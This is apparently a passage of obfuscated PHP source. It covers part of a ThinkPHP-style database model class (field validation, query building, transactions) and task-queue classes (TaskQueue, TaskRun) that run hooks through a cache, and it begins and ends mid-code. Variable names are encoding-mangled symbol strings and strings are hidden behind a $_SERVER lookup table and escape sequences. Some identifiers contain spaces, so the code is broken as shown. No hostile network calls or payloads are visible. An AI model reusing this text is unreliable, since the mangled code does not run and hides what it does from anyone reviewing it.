autoOperation(&$¹Ä€, $ÍÔ¢ÜŠÖ) { $‰ú¶‰ëë =& $_SERVER[¬ÏÕ§Áú]; if (!empty($this->options[$‰ú¶‰ëë[406]])) { $ƒ®·Â˜¸ = $this->options[$‰ú¶‰ëë[406]]; unset($this->options[$‰ú¶‰ëë[406]]); } elseif (!empty($this->_auto)) { $ƒ®·Â˜¸ = $this->_auto; } if (isset($ƒ®·Â˜¸)) { foreach ($ƒ®·Â˜¸ as $µÃ—˜ÌÑ) { if (empty($µÃ—˜ÌÑ[2])) { $µÃ—˜ÌÑ[2] = THINK_MODEL_INSERT; } if ($ÍÔ¢ÜŠÖ == $µÃ—˜ÌÑ[2] || $µÃ—˜ÌÑ[2] == THINK_MODEL_BOTH) { switch (trim($µÃ—˜ÌÑ[3])) { case $‰ú¶‰ëë[407]: case $‰ú¶‰ëë[408]: $»¨³ÆÀÖ = isset($µÃ—˜ÌÑ[4]) ? (array) $µÃ—˜ÌÑ[4] : array(); if (isset($¹Ä€[$µÃ—˜ÌÑ[0]])) { array_unshift($»¨³ÆÀÖ, $¹Ä€[$µÃ—˜ÌÑ[0]]); } if ($‰ú¶‰ëë[407] == $µÃ—˜ÌÑ[3]) { $¹Ä€[$µÃ—˜ÌÑ[0]] = call_user_func_array($µÃ—˜ÌÑ[1], $»¨³ÆÀÖ); } else { $¹Ä€[$µÃ—˜ÌÑ[0]] = call_user_func_array(array(&$this, $µÃ—˜ÌÑ[1]), $»¨³ÆÀÖ); } break; case $‰ú¶‰ëë[362]: $¹Ä€[$µÃ—˜ÌÑ[0]] = $¹Ä€[$µÃ—˜ÌÑ[1]]; break; case $‰ú¶‰ëë[409]: if ($‰ú¶‰ëë[12] === $¹Ä€[$µÃ—˜ÌÑ[0]]) { unset($¹Ä€[$µÃ—˜ÌÑ[0]]); } break; case $‰ú¶‰ëë[410]: default: $¹Ä€[$µÃ—˜ÌÑ[0]] = $µÃ—˜ÌÑ[1]; } if (!1 === $¹Ä€[$µÃ—˜ÌÑ[0]]) { unset($¹Ä€[$µÃ—˜ÌÑ[0]]); } } } } return $¹Ä€; } protected function autoValidation($ÅçÌ¡ï, $¦Ûå¸ºÁ) { $İ‡‰óâğ =& $_SERVER[¬ÏÕ§Áú]; if (!empty($this->options[$İ‡‰óâğ[411]])) { $¶‰õ„Üâ = $this->options[$İ‡‰óâğ[411]]; unset($this->options[$İ‡‰óâğ[411]]); } elseif (!empty($this->_validate)) { $¶‰õ„Üâ = $this->_validate; } if (isset($¶‰õ„Üâ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¶‰õ„Üâ as $ÕÍûª => $ºé€ì–À) { if (empty($ºé€ì–À[5]) || $ºé€ì–À[5] == THINK_MODEL_BOTH || $ºé€ì–À[5] == $¦Ûå¸ºÁ) { if (0 == strpos($ºé€ì–À[2], $İ‡‰óâğ[412]) && strpos($ºé€ì–À[2], $İ‡‰óâğ[413])) { $ºé€ì–À[2] = think_lang(substr($ºé€ì–À[2], 2, -1)); } $ºé€ì–À[3] = isset($ºé€ì–À[3]) ? $ºé€ì–À[3] : THINK_EXISTS_VALIDATE; $ºé€ì–À[4] = isset($ºé€ì–À[4]) ? $ºé€ì–À[4] : $İ‡‰óâğ[414]; switch ($ºé€ì–À[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÅçÌ¡ï, $ºé€ì–À)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($İ‡‰óâğ[12] != trim($ÅçÌ¡ï[$ºé€ì–À[0]])) { if (!1 === $this->_validationField($ÅçÌ¡ï, $ºé€ì–À)) { return !1; } } break; default: if (isset($ÅçÌ¡ï[$ºé€ì–À[0]])) { if (!1 === $this->_validationField($ÅçÌ¡ï, $ºé€ì–À)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($áßÔöÕÆ, $ı©¥ˆ ‘) { if (!1 === $this->_validationFieldItem($áßÔöÕÆ, $ı©¥ˆ ‘)) { if ($this->patchValidate) { $this->error[$ı©¥ˆ ‘[0]] = $ı©¥ˆ ‘[2]; } else { $this->error = $ı©¥ˆ ‘[2]; return !1; } } return; } protected function _validationFieldItem($¼÷¯¾óâ, $Á¢´ßñ) { $û—Óîºµ =& $_SERVER[¬ÏÕ§Áú]; switch (strtolower(trim($Á¢´ßñ[4]))) { case $û—Óîºµ[407]: case $û—Óîºµ[408]: $İÙ„ú‚ = isset($Á¢´ßñ[6]) ? (array) $Á¢´ßñ[6] : array(); if (is_string($Á¢´ßñ[0]) && strpos($Á¢´ßñ[0], $û—Óîºµ[50])) { $Á¢´ßñ[0] = explode($û—Óîºµ[50], $Á¢´ßñ[0]); } if (is_array($Á¢´ßñ[0])) { foreach ($Á¢´ßñ[0] as $‡¨É•Ë“) { $ô… ê¬ª[$‡¨É•Ë“] = $¼÷¯¾óâ[$‡¨É•Ë“]; } array_unshift($İÙ„ú‚, $ô… ê¬ª); } else { array_unshift($İÙ„ú‚, $¼÷¯¾óâ[$Á¢´ßñ[0]]); } if ($û—Óîºµ[407] == $Á¢´ßñ[4]) { return call_user_func_array($Á¢´ßñ[1], $İÙ„ú‚); } else { return call_user_func_array(array(&$this, $Á¢´ßñ[1]), $İÙ„ú‚); } case $û—Óîºµ[415]: return $¼÷¯¾óâ[$Á¢´ßñ[0]] == $¼÷¯¾óâ[$Á¢´ßñ[1]]; case $û—Óîºµ[416]: if (is_string($Á¢´ßñ[0]) && strpos($Á¢´ßñ[0], $û—Óîºµ[50])) { $Á¢´ßñ[0] = explode($û—Óîºµ[50], $Á¢´ßñ[0]); } $•Ò“õò = array(); if (is_array($Á¢´ßñ[0])) { foreach ($Á¢´ßñ[0] as $‡¨É•Ë“) { $•Ò“õò[$‡¨É•Ë“] = $¼÷¯¾óâ[$‡¨É•Ë“]; } } else { $•Ò“õò[$Á¢´ßñ[0]] = $¼÷¯¾óâ[$Á¢´ßñ[0]]; } if (!empty($¼÷¯¾óâ[$this->getPk()])) { $•Ò“õò[$this->getPk()] = array($û—Óîºµ[417], $¼÷¯¾óâ[$this->getPk()]); } if ($this->where($•Ò“õò)->find()) { return !1; } return !0; default: return $this->check($¼÷¯¾óâ[$Á¢´ßñ[0]], $Á¢´ßñ[1], $Á¢´ßñ[4]); } } public function check($³—Øïè, $á»äÙˆ, $¸®µëÜÀ = "\162\x65\x67\145\170") { $«âü»ı =& $_SERVER[¬ÏÕ§Áú]; $¸®µëÜÀ = strtolower(trim($¸®µëÜÀ)); switch ($¸®µëÜÀ) { case $«âü»ı[7]: case $«âü»ı[418]: $¬â£œÖ = is_array($á»äÙˆ) ? $á»äÙˆ : explode($«âü»ı[50], $á»äÙˆ); return $¸®µëÜÀ == $«âü»ı[7] ? in_array($³—Øïè, $¬â£œÖ) : !in_array($³—Øïè, $¬â£œÖ); case $«âü»ı[419]: case $«âü»ı[420]: if (is_array($á»äÙˆ)) { $º²·®¥‚ = $á»äÙˆ[0]; $ÉÂâùÂ± = $á»äÙˆ[1]; } else { list($º²·®¥‚, $ÉÂâùÂ±) = explode($«âü»ı[50], $á»äÙˆ); } return $¸®µëÜÀ == $«âü»ı[419] ? $³—Øïè >= $º²·®¥‚ && $³—Øïè <= $ÉÂâùÂ± : $³—Øïè < $º²·®¥‚ || $³—Øïè > $ÉÂâùÂ±; case $«âü»ı[421]: case $«âü»ı[422]: return $¸®µëÜÀ == $«âü»ı[421] ? $³—Øïè == $á»äÙˆ : $³—Øïè != $á»äÙˆ; case $«âü»ı[423]: $ğüÖ‘‹ = mb_strlen($³—Øïè, $«âü»ı[424]); if (strpos($á»äÙˆ, $«âü»ı[50])) { list($º²·®¥‚, $ÉÂâùÂ±) = explode($«âü»ı[50], $á»äÙˆ); return $ğüÖ‘‹ >= $º²·®¥‚ && $ğüÖ‘‹ <= $ÉÂâùÂ±; } else { return $ğüÖ‘‹ == $á»äÙˆ; } case $«âü»ı[425]: list($Û¨ïŞÚô, $Á‰Ó°¯Ï) = explode($«âü»ı[50], $á»äÙˆ); if (!is_numeric($Û¨ïŞÚô)) { $Û¨ïŞÚô = strtotime($Û¨ïŞÚô); } if (!is_numeric($Á‰Ó°¯Ï)) { $Á‰Ó°¯Ï = strtotime($Á‰Ó°¯Ï); } return NOW_TIME >= $Û¨ïŞÚô && NOW_TIME <= $Á‰Ó°¯Ï; case $«âü»ı[426]: return in_array(get_client_ip(), explode($«âü»ı[50], $á»äÙˆ)); case $«âü»ı[427]: return !in_array(get_client_ip(), explode($«âü»ı[50], $á»äÙˆ)); case $«âü»ı[414]: default: return $this->regex($³—Øïè, $á»äÙˆ); } } public function query($ƒ¹’‰ı, $¬¯Ï¶¡š = false) { $ŒñĞªº˜ =& $_SERVER[¬ÏÕ§Áú]; if (!is_bool($¬¯Ï¶¡š) && !is_array($¬¯Ï¶¡š)) { $¬¯Ï¶¡š = func_get_args(); array_shift($¬¯Ï¶¡š); } $ƒ¹’‰ı = str_replace(array($ŒñĞªº˜[65], $ŒñĞªº˜[428]), $ŒñĞªº˜[53], $ƒ¹’‰ı); $ƒ¹’‰ı = $this->parseSql($ƒ¹’‰ı, $¬¯Ï¶¡š); return $this->db->query($ƒ¹’‰ı); } public function execute($îÏáåç, $Ï¢»úºÌ = false) { if (!is_bool($Ï¢»úºÌ) && !is_array($Ï¢»úºÌ)) { $Ï¢»úºÌ = func_get_args(); array_shift($Ï¢»úºÌ); } $îÏáåç = $this->parseSql($îÏáåç, $Ï¢»úºÌ); return $this->db->execute($îÏáåç); } protected function parseSql($¸¨Ìü·Á, $¨“ñœ³Ë) { $ºĞª±Õ =& $_SERVER[¬ÏÕ§Áú]; if (!0 === $¨“ñœ³Ë) { $´ª¬İ– = $this->_parseOptions(); $¸¨Ìü·Á = $this->db->parseSql($¸¨Ìü·Á, $´ª¬İ–); } elseif (is_array($¨“ñœ³Ë)) { $¨“ñœ³Ë = array_map(array($this->db, $ºĞª±Õ[429]), $¨“ñœ³Ë); $¸¨Ìü·Á = vsprintf($¸¨Ìü·Á, $¨“ñœ³Ë); } else { $¸¨Ìü·Á = strtr($¸¨Ìü·Á, array($ºĞª±Õ[430] => $this->getTableName(), $ºĞª±Õ[431] => think_config($ºĞª±Õ[333]))); } $this->db->setModel($this->name); return $¸¨Ìü·Á; } public function db($Œ”Š¹÷´ = '', $Áú“¾ãõ = '', $Í®¸ ™ù = array()) { $¡­¢×±ª =& $_SERVER[¬ÏÕ§Áú]; if ($¡­¢×±ª[12] === $Œ”Š¹÷´ && $this->db) { return $this->db; } static $‚ù“Ô¹Û = array(); static $µ¨ıÔ·£ = array(); if (!isset($µ¨ıÔ·£[$Œ”Š¹÷´]) || isset($µ¨ıÔ·£[$Œ”Š¹÷´]) && $Áú“¾ãõ && $‚ù“Ô¹Û[$Œ”Š¹÷´] != $Áú“¾ãõ) { if (!empty($Áú“¾ãõ) && is_string($Áú“¾ãõ) && !1 === strpos($Áú“¾ãõ, $¡­¢×±ª[8])) { $Áú“¾ãõ = think_config($Áú“¾ãõ); } $Œ”Š¹÷´ = think_guid($Áú“¾ãõ); $µ¨ıÔ·£[$Œ”Š¹÷´] = Db::getInstance($Áú“¾ãõ); } elseif (NULL === $Áú“¾ãõ) { $µ¨ıÔ·£[$Œ”Š¹÷´]->close(); unset($µ¨ıÔ·£[$Œ”Š¹÷´]); return; } if (!empty($Í®¸ ™ù)) { if (is_string($Í®¸ ™ù)) { parse_str($Í®¸ ™ù, $Í®¸ ™ù); } foreach ($Í®¸ ™ù as $ë¸° ŞÙ => $¦°…Àİõ) { $this->setProperty($ë¸° ŞÙ, $¦°…Àİõ); } } $‚ù“Ô¹Û[$Œ”Š¹÷´] = $Áú“¾ãõ; $this->db = $µ¨ıÔ·£[$Œ”Š¹÷´]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $İÔ˜Ú±á = get_class($this); if ($İÔ˜Ú±á == $_SERVER[¬ÏÕ§Áú][432]) { return $this->name; } $this->name = substr($İÔ˜Ú±á, 0, -5); } return $this->name; } public function getTableName() { $¾ã¸ î =& $_SERVER[¬ÏÕ§Áú]; if (empty($this->trueTableName)) { $î¶¬ªúü = !empty($this->tablePrefix) ? $this->tablePrefix : $¾ã¸ î[12]; if (!empty($this->tableName)) { $î¶¬ªúü .= $this->tableName; } else { $î¶¬ªúü .= think_parse_name($this->name); } $this->trueTableName = strtolower($î¶¬ªúü); } return (!empty($this->dbName) ? $this->dbName . $¾ã¸ î[10] : $¾ã¸ î[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $•³ ËµÕ =& $_SERVER[¬ÏÕ§Áú]; return isset($this->fields[$•³ ËµÕ[340]]) ? $this->fields[$•³ ËµÕ[340]] : $this->pk; } public function getDbFields() { $µÎãØËı =& $_SERVER[¬ÏÕ§Áú]; if (isset($this->options[$µÎãØËı[368]])) { $ÄçÑˆò = $this->db->getFields($this->options[$µÎãØËı[368]]); return $ÄçÑˆò ? array_keys($ÄçÑˆò) : !1; } if ($this->fields) { $ÄçÑˆò = $this->fields; unset($ÄçÑˆò[$µÎãØËı[339]], $ÄçÑˆò[$µÎãØËı[340]], $ÄçÑˆò[$µÎãØËı[341]], $ÄçÑˆò[$µÎãØËı[338]]); return $ÄçÑˆò; } return !1; } public function data($è´ø›Ëˆ = '') { $İ²³ş„ =& $_SERVER[¬ÏÕ§Áú]; if ($İ²³ş„[12] === $è´ø›Ëˆ && !empty($this->data)) { return $this->data; } if (is_object($è´ø›Ëˆ)) { $è´ø›Ëˆ = get_object_vars($è´ø›Ëˆ); } elseif (is_string($è´ø›Ëˆ)) { parse_str($è´ø›Ëˆ, $è´ø›Ëˆ); } elseif (!is_array($è´ø›Ëˆ)) { think_exception(think_lang($İ²³ş„[360])); } $this->data = $è´ø›Ëˆ; return $this; } public function join($êÕæóé) { $Â¢Üœ”ƒ =& $_SERVER[¬ÏÕ§Áú]; if (is_array($êÕæóé)) { $this->options[$Â¢Üœ”ƒ[371]] = $êÕæóé; } elseif (!empty($êÕæóé)) { $this->options[$Â¢Üœ”ƒ[371]][] = $êÕæóé; } return $this; } public function union($ĞëêÜ§†, $ü”ƒ•–¨ = false) { $ÉĞÕƒù =& $_SERVER[¬ÏÕ§Áú]; if (empty($ĞëêÜ§†)) { return $this; } if ($ü”ƒ•–¨) { $this->options[$ÉĞÕƒù[433]][$ÉĞÕƒù[434]] = !0; } if (is_object($ĞëêÜ§†)) { $ĞëêÜ§† = get_object_vars($ĞëêÜ§†); } if (is_string($ĞëêÜ§†)) { $’Õàø—— = $ĞëêÜ§†; } elseif (is_array($ĞëêÜ§†)) { if (isset($ĞëêÜ§†[0])) { $this->options[$ÉĞÕƒù[433]] = array_merge($this->options[$ÉĞÕƒù[433]], $ĞëêÜ§†); return $this; } else { $’Õàø—— = $ĞëêÜ§†; } } else { think_exception(think_lang($ÉĞÕƒù[360])); } $this->options[$ÉĞÕƒù[433]][] = $’Õàø——; return $this; } public function cache($öûÑ“¿– = true, $ËÍëÑ¦ü = null, $ÊæàÅí = '') { $ Şûƒ»Ê =& $_SERVER[¬ÏÕ§Áú]; if (!1 !== $öûÑ“¿–) { $this->options[$ Şûƒ»Ê[435]] = array($ Şûƒ»Ê[107] => $öûÑ“¿–, $ Şûƒ»Ê[425] => $ËÍëÑ¦ü, $ Şûƒ»Ê[33] => $ÊæàÅí); } return $this; } public function field($ç…’ÂÎ, $Éºú“í = false) { $ˆÓ¿Ğéß =& $_SERVER[¬ÏÕ§Áú]; if (!0 === $ç…’ÂÎ) { $•¥í®ãû = $this->getDbFields(); $ç…’ÂÎ = $•¥í®ãû ? $•¥í®ãû : $ˆÓ¿Ğéß[233]; } elseif ($Éºú“í) { if (is_string($ç…’ÂÎ)) { $ç…’ÂÎ = explode($ˆÓ¿Ğéß[50], $ç…’ÂÎ); } $•¥í®ãû = $this->getDbFields(); $ç…’ÂÎ = $•¥í®ãû ? array_diff($•¥í®ãû, $ç…’ÂÎ) : $ç…’ÂÎ; } $this->options[$ˆÓ¿Ğéß[362]] = $ç…’ÂÎ; return $this; } public function scope($Ö¯Î¨™ş = '', $ƒ—†Ê = NULL) { $ñ´ù•ğ =& $_SERVER[¬ÏÕ§Áú]; if ($ñ´ù•ğ[12] === $Ö¯Î¨™ş) { if (isset($this->_scope[$ñ´ù•ğ[37]])) { $¢ı©Ñ¸ë = $this->_scope[$ñ´ù•ğ[37]]; } else { return $this; } } elseif (is_string($Ö¯Î¨™ş)) { $Òõ´Ë«û = explode($ñ´ù•ğ[50], $Ö¯Î¨™ş); $¢ı©Ñ¸ë = array(); foreach ($Òõ´Ë«û as $©…¡¸Æ÷) { if (!isset($this->_scope[$©…¡¸Æ÷])) { continue; } $¢ı©Ñ¸ë = array_merge($¢ı©Ñ¸ë, $this->_scope[$©…¡¸Æ÷]); } if (!empty($ƒ—†Ê) && is_array($ƒ—†Ê)) { $¢ı©Ñ¸ë = array_merge($¢ı©Ñ¸ë, $ƒ—†Ê); } } elseif (is_array($Ö¯Î¨™ş)) { $¢ı©Ñ¸ë = $Ö¯Î¨™ş; } if (is_array($¢ı©Ñ¸ë) && !empty($¢ı©Ñ¸ë)) { $this->options = array_merge($this->options, array_change_key_case($¢ı©Ñ¸ë)); } return $this; } public function where($‰Ã‰§Ëã, $ß‚ÀË«  = null) { $ˆğñçã¹ =& $_SERVER[¬ÏÕ§Áú]; if (!is_null($ß‚ÀË« ) && is_string($‰Ã‰§Ëã)) { if (!is_array($ß‚ÀË« )) { $ß‚ÀË«  = func_get_args(); array_shift($ß‚ÀË« ); } $ß‚ÀË«  = array_map(array($this->db, $ˆğñçã¹[429]), $ß‚ÀË« ); $‰Ã‰§Ëã = vsprintf($‰Ã‰§Ëã, $ß‚ÀË« ); } elseif (is_object($‰Ã‰§Ëã)) { $‰Ã‰§Ëã = get_object_vars($‰Ã‰§Ëã); } elseif (is_array($‰Ã‰§Ëã)) { foreach ($‰Ã‰§Ëã as $åøº’öÏ => $Ï©Åå¼‹) { if ((is_numeric($åøº’öÏ) || !$åøº’öÏ) && is_string($Ï©Åå¼‹)) { if (strpos($Ï©Åå¼‹, $ˆğñçã¹[436]) === 0) { continue; } think_trace($ˆğñçã¹[437], $ˆğñçã¹[12], $ˆğñçã¹[49]); die; } } } if (is_string($‰Ã‰§Ëã) && $ˆğñçã¹[12] != $‰Ã‰§Ëã) { $ØóŞæÁê = array(); $ØóŞæÁê[$ˆğñçã¹[438]] = $‰Ã‰§Ëã; $‰Ã‰§Ëã = $ØóŞæÁê; } if (isset($this->options[$ˆğñçã¹[364]])) { $this->options[$ˆğñçã¹[364]] = array_merge($this->options[$ˆğñçã¹[364]], $‰Ã‰§Ëã); } else { $this->options[$ˆğñçã¹[364]] = $‰Ã‰§Ëã; } return $this; } public function limit($¿èô‘×ç, $Âó¡¶Ø = null) { $„… ñÍÊ =& $_SERVER[¬ÏÕ§Áú]; $this->options[$„… ñÍÊ[379]] = is_null($Âó¡¶Ø) ? $¿èô‘×ç : $¿èô‘×ç . $„… ñÍÊ[50] . $Âó¡¶Ø; return $this; } public function page($Š²·é, $øÅÖ¾ª© = null) { $ÏŞá’¤ø =& $_SERVER[¬ÏÕ§Áú]; $this->options[$ÏŞá’¤ø[439]] = is_null($øÅÖ¾ª©) ? $Š²·é : $Š²·é . $ÏŞá’¤ø[50] . $øÅÖ¾ª©; return $this; } public function comment($ìö…™í) { $this->options[$_SERVER[¬ÏÕ§Áú][440]] = $ìö…™í; return $this; } public function setProperty($¬–ú¸¾£, $œ¾ÏİÃ) { if (property_exists($this, $¬–ú¸¾£)) { $this->{$¬–ú¸¾£} = $œ¾ÏİÃ; } return $this; } } goto FÍ®¶›ÂÇ”; AÑÙø³ƒŞ×: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\121\x75\145\165\x65\x4c\145\x6e\x67\164\150"; const QUEUE_DATA = "\x74\141\x73\x6b\x51\x75\145\165\145\x44\141\164\x61"; const QUEUE_TIME = "\164\141\x73\x6b\121\x75\x65\165\145\x4c\141\x73\164\122\165\x6e"; const QUEUE_THREAD = "\x74\x61\x73\x6b\121\x75\x65\x75\145\124\150\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Áïöî¢, $ó¯ÏÖà  = array(), $çÄ­†òé = '', $Èß‹Ïšñ = '') { $óÖÛÑ•× =& $_SERVER[¬ÏÕ§Áú]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Èß‹Ïšñ && array_find_by_field(self::$listData, $óÖÛÑ•×[107], $Èß‹Ïšñ)) { return !0; } if ($Èß‹Ïšñ && array_find_by_field(self::$listDataAdd, $óÖÛÑ•×[107], $Èß‹Ïšñ)) { return !0; } self::$listDataAdd[] = array($óÖÛÑ•×[353] => $Áïöî¢, $óÖÛÑ•×[1937] => $ó¯ÏÖà , $óÖÛÑ•×[545] => $çÄ­†òé, $óÖÛÑ•×[107] => $Èß‹Ïšñ); return !0; } public static function addSubmit() { $Ş¤ı§³ =& $_SERVER[¬ÏÕ§Áú]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Ş¤ı§³[1938] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Ş¤ı§³[12], $Ş¤ı§³[545])), $Ş¤ı§³[208]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($êÒ¥”…, $¢‹Àïéç = array(), $Ş¤ÌºĞø = '', $ì‰·«— = '') { $íŠˆç¶ê =& $_SERVER[¬ÏÕ§Áú]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ç£…»˜ª = self::getAll(); if ($ì‰·«— && array_find_by_field($ç£…»˜ª, $íŠˆç¶ê[107], $ì‰·«—)) { return !0; } $ç£…»˜ª[] = array($íŠˆç¶ê[353] => $êÒ¥”…, $íŠˆç¶ê[1937] => $¢‹Àïéç, $íŠˆç¶ê[545] => $Ş¤ÌºĞø, $íŠˆç¶ê[107] => $ì‰·«—); self::setAll($ç£…»˜ª); write_log($íŠˆç¶ê[1938] . $Ş¤ÌºĞø, $íŠˆç¶ê[208]); return !0; } public static function run() { $š”–Ñè =& $_SERVER[¬ÏÕ§Áú]; $“ÄÍçì• = self::getAll(); $õçÎ¢ô« = array_shift($“ÄÍçì•); if (!$õçÎ¢ô«) { return !1; } self::setAll($“ÄÍçì•); $ÃÈ³»¡ = timeFloat(); $Úïé§Íğ = $š”–Ñè[12]; try { $Úïé§Íğ = Hook::apply($õçÎ¢ô«[$š”–Ñè[353]], $õçÎ¢ô«[$š”–Ñè[1937]]); } catch (Exception $Úº£ôš¹) { write_log($Úº£ôš¹, $š”–Ñè[1319]); } $€ˆ‰Œö = number_format(timeFloat() - $ÃÈ³»¡, 3) . $š”–Ñè[1853]; if ($Úïé§Íğ && is_string($Úïé§Íğ)) { $€ˆ‰Œö = $€ˆ‰Œö . $š”–Ñè[1939] . $Úïé§Íğ; } write_log($š”–Ñè[1940] . $õçÎ¢ô«[$š”–Ñè[545]] . $š”–Ñè[1941] . $€ˆ‰Œö, $š”–Ñè[208]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¤âôâŒ‰ =& $_SERVER[¬ÏÕ§Áú]; $²‰Öã’¯ = self::threadCount() + 1; if ($²‰Öã’¯ > 3 || !self::count()) { return; } write_log($¤âôâŒ‰[1942] . $²‰Öã’¯, $¤âôâŒ‰[208]); Cache::set(self::QUEUE_THREAD, $²‰Öã’¯, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¤âôâŒ‰[1943], $¤âôâŒ‰[208]); } public static function getKey($¢öƒğä¾, $€³Ş†¼€ = "\151\x6e\164") { $×¹¹·Í =& $_SERVER[¬ÏÕ§Áú]; Cache::removeMemory($¢öƒğä¾); $ïû­Øß = Cache::get($¢öƒğä¾); if ($€³Ş†¼€ == $×¹¹·Í[375]) { return $ïû­Øß ? intval($ïû­Øß) : 0; } if ($€³Ş†¼€ == $×¹¹·Í[1944]) { return is_array($ïû­Øß) ? $ïû­Øß : array(); } return $ïû­Øß; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¬ÏÕ§Áú][1944]); } public static function setAll($ÙÖµç) { $©€ÅÍ°ª = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÙÖµç), $©€ÅÍ°ª); Cache::set(self::QUEUE_DATA, $ÙÖµç, $©€ÅÍ°ª); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($á¦üñµº, $ğÊßı­ƒ = 5.0) { if (!$á¦üñµº) { return; } $ìÅ’ş¿Ü = Cache::get($á¦üñµº); if (!$ìÅ’ş¿Ü || timeFloat() - floatVal($ìÅ’ş¿Ü) >= $ğÊßı­ƒ) { Cache::set($á¦üñµº, timeFloat(), $ğÊßı­ƒ * 10); return !0; } return !1; } public static function timeLimitCall($‹Ì¡ÁŠŸ, $ëßÇÅÓ, $Ÿ—¦µƒ, $÷·ïæ½ = 5.0) { $à êãœÜ =& $_SERVER[¬ÏÕ§Áú]; if (!$‹Ì¡ÁŠŸ || !$ëßÇÅÓ) { return; } self::$asyncAdd = !0; $öÁ­×µâ = $à êãœÜ[1945]; $ĞƒïÂº» = Cache::get($öÁ­×µâ, !0); $‚ÌåÃÎ° = array($à êãœÜ[1946] => timeFloat(), $à êãœÜ[1947] => timeFloat(), $à êãœÜ[353] => $ëßÇÅÓ, $à êãœÜ[1937] => $Ÿ—¦µƒ, $à êãœÜ[1948] => $÷·ïæ½); if (is_array($ĞƒïÂº»[$‹Ì¡ÁŠŸ])) { if (timeFloat() - $ĞƒïÂº»[$‹Ì¡ÁŠŸ][$à êãœÜ[1946]] <= $‚ÌåÃÎ°[$à êãœÜ[1948]] * 0.5) { return; } $‚ÌåÃÎ°[$à êãœÜ[1947]] = $ĞƒïÂº»[$‹Ì¡ÁŠŸ][$à êãœÜ[1947]]; } $ĞƒïÂº»[$‹Ì¡ÁŠŸ] = $‚ÌåÃÎ°; Cache::set($öÁ­×µâ, $ĞƒïÂº», 60); Cache::removeMemory($öÁ­×µâ); write_log($à êãœÜ[1949] . $‹Ì¡ÁŠŸ . $à êãœÜ[84] . $ëßÇÅÓ . $à êãœÜ[1950] . ACTION, $à êãœÜ[208]); } public static function timeLimitCallLoop() { $û’×Ûû =& $_SERVER[¬ÏÕ§Áú]; $°øïÓÃ = array($û’×Ûû[1951]); $ÌØ¼Ñâ = in_array(strtolower(ACTION), $°øïÓÃ); if (!$ÌØ¼Ñâ && !self::$asyncAdd) { return; } $ŞÇï•³ª = $û’×Ûû[1945]; $²¡˜È¶Ã = Cache::get($ŞÇï•³ª, !0); if (!$²¡˜È¶Ã || count($²¡˜È¶Ã) <= 0) { return; } $‡ÖÙ½ñ¯ = timeFloat(); $›è…‰×¬ = array(); $¡¶İ¤‘ñ = array(); foreach ($²¡˜È¶Ã as $Ãğ±ä¬€ => $Ù ûÜ·ø) { if ($‡ÖÙ½ñ¯ - $Ù ûÜ·ø[$û’×Ûû[1947]] > $Ù ûÜ·ø[$û’×Ûû[1948]]) { $¡¶İ¤‘ñ[$Ãğ±ä¬€] = $Ù ûÜ·ø; continue; } $›è…‰×¬[$Ãğ±ä¬€] = $Ù ûÜ·ø; } if (count($¡¶İ¤‘ñ) == 0) { return; } if (count($›è…‰×¬) == 0) { Cache::remove($ŞÇï•³ª); } else { Cache::set($ŞÇï•³ª, $›è…‰×¬, 60); } Cache::removeMemory($ŞÇï•³ª); self::runArr($¡¶İ¤‘ñ); } public static function finished($Ë’¢Ò¨‰, $‰ƒóú†‘) { $§µ·°Š÷ =& $_SERVER[¬ÏÕ§Áú]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($§µ·°Š÷[353] => $Ë’¢Ò¨‰, $§µ·°Š÷[1937] => $‰ƒóú†‘); } private static function runArr($ùôª÷öè) { $ª¿ŸŒÕÄ =& $_SERVER[¬ÏÕ§Áú]; if (!$ùôª÷öè) { return; } foreach ($ùôª÷öè as $µÓûÊ±î => $úøöĞÆ’) { try { Hook::apply($úøöĞÆ’[$ª¿ŸŒÕÄ[353]], $úøöĞÆ’[$ª¿ŸŒÕÄ[1937]]); write_log($ª¿ŸŒÕÄ[1952] . $µÓûÊ±î . $ª¿ŸŒÕÄ[84] . $úøöĞÆ’[$ª¿ŸŒÕÄ[353]] . $ª¿ŸŒÕÄ[1950] . ACTION, $ª¿ŸŒÕÄ[208]); } catch (Exception $ÒÔã„—¼) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ÒÇ’ßæİ =& $_SERVER[¬ÏÕ§Áú]; parent::startAfter(); 